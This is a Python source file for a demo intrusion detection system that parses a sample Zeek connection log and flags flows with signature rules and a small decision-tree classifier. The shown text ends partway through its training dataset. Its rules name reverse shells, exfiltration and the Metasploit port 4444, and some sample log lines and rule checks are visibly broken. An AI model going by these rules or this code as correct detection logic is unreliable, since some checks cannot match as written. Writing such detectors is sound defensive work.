#!/usr/bin/env python3
"""
X8 — Network Intrusion Detection System
Hybrid NIDS with signature matching (Aho-Corasick) + ML decision-tree classifier.
"""

import re
import math
import time
import json
from collections import defaultdict, Counter


# ---------------------------------------------------------------------------
# Embedded sample Zeek-style conn.log lines (offline demo)
# ---------------------------------------------------------------------------
SAMPLE_CONN_LOG = (
    "#separator \\x09\n"
    "#set_separator\\t,\n"
    "#empty_field\t(empty)\n"
    "#unset_field\t-\n"
    "#path\tconn\n"
    "#open\t2024-01-15-10-00-00\n"
    "#fields\tts	uid	id.orig_h	id.orig_p	id.resp_h	id.resp_p	proto	service	duration	orig_bytes	resp_bytes	conn_state	local_orig	local_resp	missed_bytes	history	orig_pkts	orig_ip_bytes	resp_pkts	resp_ip_bytes	tunnel_parents\n"
    "#types	time	string	addr	port	addr	port	enum	string	interval	count	count	string	bool	bool	count	string	count	count	count	count	set[string]\n"
    "1705312800.123456	CFhkJ21Yg0tVvZCjjk	192.168.1.100	49152	10.0.0.5	22	udp	-	0.001234	64	128	SF	T	T	0	-Dd	2	104	1	156	-\n"
    "1705312801.234567	CFhkJ21Yg0tVvZCjjk	192.168.1.100	49153	10.0.0.5	80	tcp	http	0.543210	1234	5678	SF	T	T	0	ShADadFf	6	1290	4	5954	-\n"
    "1705312802.345678	DFkLm32Zh1uWwAEllm	192.168.1.200	51234	203.0.113.50	443	tcp	ssl	12.000000	500000	200000	SF	T	T	0	ShADadFf	10	50020	8	20320	-\n"
    "1705312803.456789	EGmNn43Ai2xXxBFmmn	192.168.1.100	49154	198.51.100.23	53	udp	dns	0.000456	89	256	SF	T	T	0	Dd	1	117	1	284	-\n"
    "1705312804.567890	FHoOo54Bj3yYyCGnno	192.168.1.100	49155	10.0.0.10	3389	tcp	-	0.010000	45678	12345	SF	T	T	0	ShADadFf	8	45838	5	12597	-\n"
    "1705312805.678901	GIpPp65Ck4zZzDHoop	10.0.0.5	22	192.168.1.100	49156	tcp	-	0.000123	64	128	SF	F	T	0	^D	2	104	1	156	-\n"
    "1705312806.789012	HJqQq76Dl5aAaEIPpp	192.168.1.100	49157	45.33.32.0	80	tcp	http	0.000200	1024	8192	SF	T	T	0	ShADadFf	4	1184	3	8348	-\n"
    "1705312807.890123	IKrRr87Em6bBbFJQqq	192.168.1.100	49158	45.33.32.0	4444	tcp	-	30.000000	65535	0	RSTO	T	T	0	ShR	1	65575	0	0	-\n"
    "1705312808.901234	JLsSs98Fn7cCcGKRRr	192.168.1.100	49159	10.0.0.5	80	tcp	http	0.005000	256	65536	SF	T	T	0	ShADadFf	3	376	12	65796	-\n"
    "1705312809.012345	KMtTt09Go8dDdHLSSs	192.168.1.100	49160	198.51.100.77	1337	tcp	-	0.000100	1024	0	S0	T	T	0	^	1	1064	0	0	-\n"
    "1705312810.123456	LNuUu10Hp9eEeIMTTt	10.0.0.10	445	192.168.1.100	49161	tcp	-	0.000300	64	128	SF	F	T	0	^D	2	104	1	156	-\n"
    "1705312811.234567	MOvVv21Iq0fFfJNUUu	192.168.1.100	49162	10.0.0.5	21	tcp	ftp	5.000000	2048	4096	SF	T	T	0	ShADadFf	6	2208	4	4256	-\n"
    "1705312812.345678	NPwWw32Jr1gGgKOVVv	192.168.1.100	49163	10.0.0.5	25	tcp	smtp	0.200000	4096	1024	SF	T	T	0	ShADadFf	5	4256	3	1184	-\n"
    "1705312813.456789	OQxXx43Ks2hHhLPWWw	192.168.1.200	51235	203.0.113.50	443	tcp	ssl	0.050000	2048	4096	SF	T	T	0	ShADadFf	4	2208	3	4256	-\n"
    "1705312814.567890	PRyYy54Lt3iIiMQXXx	192.168.1.100	49164	45.33.32.0	80	tcp	http	0.001000	512	16384	SF	T	T	0	ShADadFf	3	632	5	16634	-\n"
    "1705312815.678901	QSzZz65Mu4jJjNRYy	192.168.1.100	49165	10.0.0.5	53	udp	dns	0.000300	64	512	SF	T	T	0	Dd	1	92	1	540	-\n"
    "1705312816.789012	RTaAa76Nv5kKkOSZz	10.0.0.5	23	192.168.1.100	49166	tcp	-	0.000200	64	128	SF	F	T	0	^	1	104	1	156	-\n"
    "1705312817.890123	SUbBb87Ow6lLlPTaA	192.168.1.100	49167	45.33.32.0	9090	tcp	http	0.000150	256	1024	SF	T	T	0	ShADadFf	3	376	2	1184	-\n"
    "1705312818.901234-TVcCc98Px7mMmQUbB	192.168.1.100	49168	10.0.0.10	4444	tcp	-	0.000100	1024	0	S0	T	T	0	^	1	1064	0	0	-\n"
    "1705312819.012345	UWdDd09Qy8nNnRVcC	192.168.1.100	49169	45.33.32.0	4444	tcp	-	0.000200	2048	0	S0	T	T	0	^	1	2088	0	0	-\n"
    "1705312820.123456	VXeEe10Rz9oOoSWdD	10.0.0.5	22	192.168.1.200	51236	tcp	-	0.000100	64	128	SF	F	T	0	^	1	104	1	156	-\n"
    "1705312821.234567	WYfFf21SA0pPpTXeE	192.168.1.100	49170	203.0.113.100	8080	tcp	http	0.000300	4096	32768	SF	T	T	0	ShADadFf	5	4256	8	33028	-\n"
    "1705312822.345678-XZgGg32TB1qQqUYfF	192.168.1.100	49171	45.33.32.0	4444	tcp	-	60.000000	131072	1024	ShADadFf	T	T	0	ShADadFf	20	131392	5	1274	-\n"
    "1705312823.456789	AYhHh43UC2rRrVZgG	192.168.1.100	49172	10.0.0.5	80	tcp	http	0.000400	128	256	SF	T	T	0	ShADadFf	2	248	1	284	-\n"
    "1705312824.567890	BZiIi54VD3sSsWAhH	10.0.0.10	135	192.168.1.100	49173	tcp	-	0.000200	64	128	SF	F	T	0	^	1	104	1	156	-\n"
    "1705312825.678901	CAjJj65WE4tTtXBiI	192.168.1.100	49174	45.33.32.0	22	tcp	ssh	0.010000	512	1024	SF	T	T	0	ShADadFf	4	672	3	1184	-\n"
    "1705312826.789012	DBkKk76XF5uUuYCjJ	192.168.1.100	49175	45.33.32.0	4444	tcp	-	0.000100	4096	0	S0	T	T	0	^	1	4136	0	0	-\n"
    "1705312827.890123	EClLl87YG6vVvZDkK	10.0.0.5	22	192.168.1.100	49176	tcp	-	0.000050	64	128	SF	F	T	0	^	1	104	1	156	-\n"
    "1705312828.901234	FDmMm98ZH7wWwAElL	192.168.1.100	49177	203.0.113.50	443	tcp	ssl	0.020000	1024	2048	SF	T	T	0	ShADadFf	3	1144	2	2204	-\n"
    "1705312829.012345GENnN09AI8xXxBFmM	192.168.1.100	49178	45.33.32.0	4444	tcp	-	45.000000	65535	0	RSTO	T	T	0	ShR	1	65575	0	0	-\n"
    "1705312830.123456	HFoOo10BJ9yYyCGnN	192.168.1.100	49179	10.0.0.5	8080	tcp	http	0.000300	256	16384	SF	T	T	0	ShADadFf	3	376	5	16634	-\n"
)


# ---------------------------------------------------------------------------
# Zeek conn.log parser
# ---------------------------------------------------------------------------
class ConnLogParser:
    FIELD_NAMES = [
        "ts", "uid", "id.orig_h", "id.orig_p", "id.resp_h", "id.resp_p",
        "proto", "service", "duration", "orig_bytes", "resp_bytes",
        "conn_state", "local_orig", "local_resp", "missed_bytes",
        "history", "orig_pkts", "orig_ip_bytes", "resp_pkts", "resp_ip_bytes",
        "tunnel_parents",
    ]

    NUMERIC_FIELDS = {
        "ts": float, "id.orig_p": int, "id.resp_p": int,
        "duration": float, "orig_bytes": int, "resp_bytes": int,
        "orig_pkts": int, "resp_pkts": int,
        "orig_ip_bytes": int, "resp_ip_bytes": int,
    }

    def _coerce(self, value, target_type, default=0):
        if value == "-" or value is None:
            return default
        try:
            return target_type(value)
        except (ValueError, TypeError):
            return default

    def parse(self, log_text):
        flows = []
        for line in log_text.strip().split("\n"):
            line = line.strip()
            if not line:
                continue
            if line.startswith("#"):
                if "#fields" in line:
                    parts = line.split("\t")
                    self.FIELD_NAMES = [p.strip() for p in parts[1:]]
                continue
            fields = line.split("\t")
            if len(fields) < 11:
                continue
            rec = {}
            for i, name in enumerate(self.FIELD_NAMES):
                rec[name] = fields[i] if i < len(fields) else "-"
            for field_name, target_type in self.NUMERIC_FIELDS.items():
                rec[field_name] = self._coerce(rec.get(field_name), target_type)
            flows.append(rec)
        return flows


# ---------------------------------------------------------------------------
# Feature extraction from flows
# ---------------------------------------------------------------------------
class FlowFeatureExtractor:
    SUSPICIOUS_PORTS = {4444, 5555, 6666, 1337, 31337, 9001, 1234, 44444}
    COMMON_PORTS = {22, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 53, 8080, 8443, 21, 23, 25}

    def extract(self, flow):
        orig_bytes = flow.get("orig_bytes", 0)
        resp_bytes = flow.get("resp_bytes", 0)
        total_bytes = orig_bytes + resp_bytes
        duration = flow.get("duration", 0)
        orig_pkts = flow.get("orig_pkts", 0)
        resp_pkts = flow.get("resp_pkts", 0)
        total_pkts = orig_pkts + resp_pkts
        resp_p = flow.get("id.resp_p", 0)
        conn_state = flow.get("conn_state", "")

        bytes_ratio = 0.0
        if total_bytes > 0:
            bytes_ratio = orig_bytes / total_bytes

        pkts_ratio = 0.0
        if total_pkts > 0:
            pkts_ratio = orig_pkts / total_pkts

        avg_pkt_size = total_bytes / total_pkts if total_pkts > 0 else 0
        rate = total_bytes / duration if duration > 0 else 0

        state_flags = {
            "S0": conn_state.count("S"), "S1": conn_state.count("S"),
            "S2": conn_state.count("S"), "S3": conn_state.count("S"),
            "RSTO": conn_state.count("R"), "RSTR": conn_state.count("R"),
            "RSTOS0": conn_state.count("R"),
        }
        syn_count = conn_state.count("S")
        rst_count = conn_state.count("R")
        fin_count = conn_state.count("F")

        return {
            "duration": duration,
            "orig_bytes": orig_bytes,
            "resp_bytes": resp_bytes,
            "total_bytes": total_bytes,
            "orig_pkts": orig_pkts,
            "resp_pkts": resp_pkts,
            "total_pkts": total_pkts,
            "bytes_ratio": bytes_ratio,
            "pkts_ratio": pkts_ratio,
            "avg_pkt_size": avg_pkt_size,
            "rate": rate,
            "resp_port": resp_p,
            "suspicious_port": 1 if resp_p in self.SUSPICIOUS_PORTS else 0,
            "common_port": 1 if resp_p in self.COMMON_PORTS else 0,
            "syn_count": syn_count,
            "rst_count": rst_count,
            "fin_count": fin_count,
            "has_service": 0 if flow.get("service", "-") == "-" else 1,
            "proto_tcp": 1 if flow.get("proto") == "tcp" else 0,
            "proto_udp": 1 if flow.get("proto") == "udp" else 0,
        }


# ---------------------------------------------------------------------------
# Aho-Corasick multi-pattern matcher
# ---------------------------------------------------------------------------
class AhoCorasick:
    def __init__(self):
        self.goto = [{}]
        self.fail = [0]
        self.output = [[]]
        self.state_count = 1

    def add_pattern(self, pattern, tag):
        state = 0
        for ch in pattern:
            ch = ch.lower()
            if ch not in self.goto[state]:
                self.goto.append({})
                self.fail.append(0)
                self.output.append([])
                self.goto[state][ch] = self.state_count
                self.state_count += 1
            state = self.goto[state][ch]
        self.output[state].append(tag)

    def build(self):
        from collections import deque
        queue = deque()
        for ch, s in self.goto[0].items():
            self.fail[s] = 0
            queue.append(s)
        while queue:
            r = queue.popleft()
            for ch, s in self.goto[r].items():
                queue.append(s)
                state = self.fail[r]
                while state != 0 and ch not in self.goto[state]:
                    state = self.fail[state]
                self.fail[s] = self.goto[state].get(ch, 0)
                if self.fail[s] == s:
                    self.fail[s] = 0
                self.output[s] = self.output[s] + self.output[self.fail[s]]

    def search(self, text):
        text_lower = text.lower()
        state = 0
        results = []
        for i, ch in enumerate(text_lower):
            while state != 0 and ch not in self.goto[state]:
                state = self.fail[state]
            state = self.goto[state].get(ch, 0)
            if self.output[state]:
                for tag in self.output[state]:
                    results.append((i, tag))
        return results


# ---------------------------------------------------------------------------
# Naive multi-pattern matcher (for comparison)
# ---------------------------------------------------------------------------
def naive_pattern_match(text, patterns):
    text_lower = text.lower()
    results = []
    for pattern, tag in patterns:
        p = pattern.lower()
        idx = 0
        while True:
            idx = text_lower.find(p, idx)
            if idx == -1:
                break
            results.append((idx, tag))
            idx += 1
    return results


# ---------------------------------------------------------------------------
# Suricata-style signature engine
# ---------------------------------------------------------------------------
class SignatureEngine:
    def __init__(self):
        self.rules = []
        self._build_default_rules()

    def _build_default_rules(self):
        self.rules = [
            {
                "sid": 1000001,
                "msg": "Potential reverse shell (outbound to high port)",
                "flow": {"resp_port_min": 4440, "resp_port_max": 4450},
                "severity": 1,
            },
            {
                "sid": 1000002,
                "msg": "Large data transfer (possible exfiltration)",
                "flow": {"orig_bytes_min": 50000},
                "severity": 2,
            },
            {
                "sid": 1000003,
                "msg": "Connection to known suspicious port",
                "flow": {"suspicious_port": True},
                "severity": 1,
            },
            {
                "sid": 1000004,
                "msg": "High-duration session with low response",
                "flow": {"duration_min": 30, "resp_bytes_max": 100},
                "severity": 2,
            },
            {
                "sid": 1000005,
                "msg": "RST after short connection (port scan indicator)",
                "flow": {"conn_state": "RSTO", "duration_max": 0.1},
                "severity": 3,
            },
            {
                "sid": 1000006,
                "msg": "Repeated connections to same high port",
                "flow": {"resp_port_min": 1024, "total_pkts_max": 3, "orig_bytes_min": 500},
                "severity": 2,
            },
            {
                "sid": 1000007,
                "msg": "Outbound SMTP (possible spam/phishing)",
                "flow": {"resp_port": 25, "orig_bytes_min": 1000},
                "severity": 3,
            },
            {
                "sid": 1000008,
                "msg": "Connection to port 4444 (Metasploit default)",
                "flow": {"resp_port": 4444},
                "severity": 1,
            },
        ]

    def add_payload_pattern(self, sid, msg, regex, severity=2):
        self.rules.append({
            "sid": sid,
            "msg": msg,
            "payload_regex": regex,
            "severity": severity,
        })

    def evaluate_flow(self, flow_features, raw_flow):
        alerts = []
        for rule in self.rules:
            if "payload_regex" in rule:
                continue
            matched = True
            cond = rule["flow"]
            if "resp_port" in cond and flow_features.get("resp_port") != cond["resp_port"]:
                matched = False
            if "resp_port_min" in cond and flow_features.get("resp_port", 0) < cond["resp_port_min"]:
                matched = False
            if "resp_port_max" in cond and flow_features.get("resp_port", 0) > cond["resp_port_max"]:
                matched = False
            if "orig_bytes_min" in cond and flow_features.get("orig_bytes", 0) < cond["orig_bytes_min"]:
                matched = False
            if "resp_bytes_max" in cond and flow_features.get("resp_bytes", 0) > cond["resp_bytes_max"]:
                matched = False
            if "duration_min" in cond and flow_features.get("duration", 0) < cond["duration_min"]:
                matched = False
            if "duration_max" in cond and flow_features.get("duration", 0) > cond["duration_max"]:
                matched = False
            if "conn_state" in cond and flow_features.get("conn_state", "") != cond["conn_state"]:
                matched = False
            if "suspicious_port" in cond and not flow_features.get("suspicious_port"):
                matched = False
            if "total_pkts_max" in cond and flow_features.get("total_pkts", 0) > cond["total_pkts_max"]:
                matched = False
            if matched:
                alerts.append({
                    "sid": rule["sid"],
                    "msg": rule["msg"],
                    "severity": rule["severity"],
                })
        return alerts


# ---------------------------------------------------------------------------
# Pure-Python Decision Tree (for classification)
# ---------------------------------------------------------------------------
class DecisionNode:
    def __init__(self, feature=None, threshold=None, left=None, right=None, label=None):
        self.feature = feature
        self.threshold = threshold
        self.left = left
        self.right = right
        self.label = label


class DecisionTree:
    def __init__(self, max_depth=5, min_samples=2):
        self.max_depth = max_depth
        self.min_samples = min_samples
        self.root = None

    def fit(self, X, y):
        self.feature_names = list(X[0].keys()) if X else []
        self.root = self._build(X, y, 0)

    def _gini(self, labels):
        if not labels:
            return 0.0
        counts = Counter(labels)
        total = len(labels)
        return 1.0 - sum((c / total) ** 2 for c in counts.values())

    def _build(self, X, y, depth):
        if len(set(y)) == 1 or depth >= self.max_depth or len(y) < self.min_samples:
            majority = Counter(y).most_common(1)[0][0] if y else 0
            return DecisionNode(label=majority)
        best_gain = -1
        best_feat = None
        best_thresh = None
        parent_gini = self._gini(y)
        n = len(y)
        for feat in self.feature_names:
            values = sorted(set(row[feat] for row in X))
            if len(values) <= 1:
                continue
            thresholds = [(values[i] + values[i + 1]) / 2 for i in range(len(values) - 1)]
            for thresh in thresholds[:5]:
                left_y = [y[i] for i in range(n) if X[i][feat] <= thresh]
                right_y = [y[i] for i in range(n) if X[i][feat] > thresh]
                if not left_y or not right_y:
                    continue
                gain = parent_gini - (len(left_y) / n * self._gini(left_y) +
                                      len(right_y) / n * self._gini(right_y))
                if gain > best_gain:
                    best_gain = gain
                    best_feat = feat
                    best_thresh = thresh
        if best_feat is None:
            majority = Counter(y).most_common(1)[0][0] if y else 0
            return DecisionNode(label=majority)
        left_idx = [i for i in range(n) if X[i][best_feat] <= best_thresh]
        right_idx = [i for i in range(n) if X[i][best_feat] > best_thresh]
        left = self._build([X[i] for i in left_idx], [y[i] for i in left_idx], depth + 1)
        right = self._build([X[i] for i in right_idx], [y[i] for i in right_idx], depth + 1)
        return DecisionNode(feature=best_feat, threshold=best_thresh, left=left, right=right)

    def predict_one(self, row):
        node = self.root
        while node and node.label is None:
            val = row.get(node.feature, 0)
            if val <= node.threshold:
                node = node.left
            else:
                node = node.right
        return node.label if node else 0

    def predict(self, X):
        return [self.predict_one(row) for row in X]


# ---------------------------------------------------------------------------
# Random Forest (ensemble of decision trees)
# ---------------------------------------------------------------------------
class RandomForest:
    def __init__(self, n_trees=5, max_depth=5):
        self.n_trees = n_trees
        self.max_depth = max_depth
        self.trees = []

    def fit(self, X, y):
        import random
        self.trees = []
        n = len(X)
        for t in range(self.n_trees):
            bag_idx = [random.randint(0, n - 1) for _ in range(n)]
            tree = DecisionTree(max_depth=self.max_depth)
            tree.fit([X[i] for i in bag_idx], [y[i] for i in bag_idx])
            self.trees.append(tree)

    def predict_one(self, row):
        votes = [tree.predict_one(row) for tree in self.trees]
        return Counter(votes).most_common(1)[0][0]

    def predict(self, X):
        return [self.predict_one(row) for row in X]


# ---------------------------------------------------------------------------
# Embedded labeled dataset for training
# ---------------------------------------------------------------------------
EMBEDDED_DATASET = [
    {"features": {"duration": 0.001, "orig_bytes": 64, "resp_bytes": 128, "total_bytes": 192, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 64.0, "rate": 155462.0, "resp_port": 22, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 0, "proto_udp": 1}, "label": 0},
    {"features": {"duration": 0.543, "orig_bytes": 1234, "resp_bytes": 5678, "total_bytes": 6912, "orig_pkts": 6, "resp_pkts": 4, "total_pkts": 10, "bytes_ratio": 0.179, "pkts_ratio": 0.6, "avg_pkt_size": 691.2, "rate": 12728.0, "resp_port": 80, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 12.0, "orig_bytes": 500000, "resp_bytes": 200000, "total_bytes": 700000, "orig_pkts": 10, "resp_pkts": 8, "total_pkts": 18, "bytes_ratio": 0.714, "pkts_ratio": 0.556, "avg_pkt_size": 38888.9, "rate": 58333.3, "resp_port": 443, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.000456, "orig_bytes": 89, "resp_bytes": 256, "total_bytes": 345, "orig_pkts": 1, "resp_pkts": 1, "total_pkts": 2, "bytes_ratio": 0.258, "pkts_ratio": 0.5, "avg_pkt_size": 172.5, "rate": 756578.9, "resp_port": 53, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 0, "proto_udp": 1}, "label": 0},
    {"features": {"duration": 0.01, "orig_bytes": 45678, "resp_bytes": 12345, "total_bytes": 58023, "orig_pkts": 8, "resp_pkts": 5, "total_pkts": 13, "bytes_ratio": 0.787, "pkts_ratio": 0.615, "avg_pkt_size": 4463.3, "rate": 5802300.0, "resp_port": 3389, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 1},
    {"features": {"duration": 30.0, "orig_bytes": 65535, "resp_bytes": 0, "total_bytes": 65535, "orig_pkts": 1, "resp_pkts": 0, "total_pkts": 1, "bytes_ratio": 1.0, "pkts_ratio": 1.0, "avg_pkt_size": 65535.0, "rate": 2184.5, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 1, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0001, "orig_bytes": 1024, "resp_bytes": 0, "total_bytes": 1024, "orig_pkts": 1, "resp_pkts": 0, "total_pkts": 1, "bytes_ratio": 1.0, "pkts_ratio": 1.0, "avg_pkt_size": 1024.0, "rate": 10240000.0, "resp_port": 1337, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0003, "orig_bytes": 64, "resp_bytes": 128, "total_bytes": 192, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 64.0, "rate": 640000.0, "resp_port": 445, "suspicious_port": 0, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 1},
    {"features": {"duration": 0.0002, "orig_bytes": 256, "resp_bytes": 16384, "total_bytes": 16640, "orig_pkts": 3, "resp_pkts": 5, "total_pkts": 8, "bytes_ratio": 0.015, "pkts_ratio": 0.375, "avg_pkt_size": 2080.0, "rate": 83200000.0, "resp_port": 80, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 5.0, "orig_bytes": 2048, "resp_bytes": 4096, "total_bytes": 6144, "orig_pkts": 6, "resp_pkts": 4, "total_pkts": 10, "bytes_ratio": 0.333, "pkts_ratio": 0.6, "avg_pkt_size": 614.4, "rate": 1228.8, "resp_port": 21, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.2, "orig_bytes": 4096, "resp_bytes": 1024, "total_bytes": 5120, "orig_pkts": 5, "resp_pkts": 3, "total_pkts": 8, "bytes_ratio": 0.8, "pkts_ratio": 0.625, "avg_pkt_size": 640.0, "rate": 25600.0, "resp_port": 25, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 1},
    {"features": {"duration": 60.0, "orig_bytes": 131072, "resp_bytes": 1024, "total_bytes": 132096, "orig_pkts": 20, "resp_pkts": 5, "total_pkts": 25, "bytes_ratio": 0.992, "pkts_ratio": 0.8, "avg_pkt_size": 5283.8, "rate": 2201.6, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.00015, "orig_bytes": 256, "resp_bytes": 1024, "total_bytes": 1280, "orig_pkts": 3, "resp_pkts": 2, "total_pkts": 5, "bytes_ratio": 0.2, "pkts_ratio": 0.6, "avg_pkt_size": 256.0, "rate": 8533333.3, "resp_port": 9090, "suspicious_port": 0, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.0002, "orig_bytes": 1024, "resp_bytes": 0, "total_bytes": 1024, "orig_pkts": 1, "resp_pkts": 0, "total_pkts": 1, "bytes_ratio": 1.0, "pkts_ratio": 1.0, "avg_pkt_size": 1024.0, "rate": 5120000.0, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0001, "orig_bytes": 64, "resp_bytes": 128, "total_bytes": 192, "orig_pkts": 1, "resp_pkts": 1, "total_pkts": 2, "bytes_ratio": 0.333, "pkts_ratio": 0.5, "avg_pkt_size": 96.0, "rate": 1920000.0, "resp_port": 135, "suspicious_port": 0, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 1},
    {"features": {"duration": 0.01, "orig_bytes": 512, "resp_bytes": 1024, "total_bytes": 1536, "orig_pkts": 4, "resp_pkts": 3, "total_pkts": 7, "bytes_ratio": 0.333, "pkts_ratio": 0.571, "avg_pkt_size": 219.4, "rate": 153600.0, "resp_port": 22, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.0001, "orig_bytes": 4096, "resp_bytes": 0, "total_bytes": 4096, "orig_pkts": 1, "resp_pkts": 0, "total_pkts": 1, "bytes_ratio": 1.0, "pkts_ratio": 1.0, "avg_pkt_size": 4096.0, "rate": 40960000.0, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0003, "orig_bytes": 64, "resp_bytes": 128, "total_bytes": 192, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 64.0, "rate": 640000.0, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0002, "orig_bytes": 128, "resp_bytes": 256, "total_bytes": 384, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 128.0, "rate": 1920000.0, "resp_port": 8080, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 45.0, "orig_bytes": 65535, "resp_bytes": 1024, "total_bytes": 66559, "orig_pkts": 20, "resp_pkts": 5, "total_pkts": 25, "bytes_ratio": 0.985, "pkts_ratio": 0.8, "avg_pkt_size": 2662.4, "rate": 1479.1, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 1, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0004, "orig_bytes": 64, "resp_bytes": 128, "total_bytes": 192, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 64.0, "rate": 480000.0, "resp_port": 23, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 1},
    {"features": {"duration": 0.0003, "orig_bytes": 512, "resp_bytes": 16384, "total_bytes": 16896, "orig_pkts": 3, "resp_pkts": 5, "total_pkts": 8, "bytes_ratio": 0.03, "pkts_ratio": 0.375, "avg_pkt_size": 2112.0, "rate": 56320000.0, "resp_port": 80, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.0005, "orig_bytes": 256, "resp_bytes": 512, "total_bytes": 768, "orig_pkts": 3, "resp_pkts": 2, "total_pkts": 5, "bytes_ratio": 0.333, "pkts_ratio": 0.6, "avg_pkt_size": 153.6, "rate": 1536000.0, "resp_port": 443, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.01, "orig_bytes": 2048, "resp_bytes": 4096, "total_bytes": 6144, "orig_pkts": 4, "resp_pkts": 3, "total_pkts": 7, "bytes_ratio": 0.333, "pkts_ratio": 0.571, "avg_pkt_size": 877.7, "rate": 614400.0, "resp_port": 80, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
    {"features": {"duration": 0.0001, "orig_bytes": 2048, "resp_bytes": 0, "total_bytes": 2048, "orig_pkts": 1, "resp_pkts": 0, "total_pkts": 1, "bytes_ratio": 1.0, "pkts_ratio": 1.0, "avg_pkt_size": 2048.0, "rate": 20480000.0, "resp_port": 4444, "suspicious_port": 1, "common_port": 0, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 0, "proto_tcp": 1, "proto_udp": 0}, "label": 2},
    {"features": {"duration": 0.0003, "orig_bytes": 128, "resp_bytes": 256, "total_bytes": 384, "orig_pkts": 2, "resp_pkts": 1, "total_pkts": 3, "bytes_ratio": 0.333, "pkts_ratio": 0.667, "avg_pkt_size": 128.0, "rate": 1280000.0, "resp_port": 443, "suspicious_port": 0, "common_port": 1, "syn_count": 0, "rst_count": 0, "fin_count": 0, "has_service": 1, "proto_tcp": 1, "proto_udp": 0}, "label": 0},
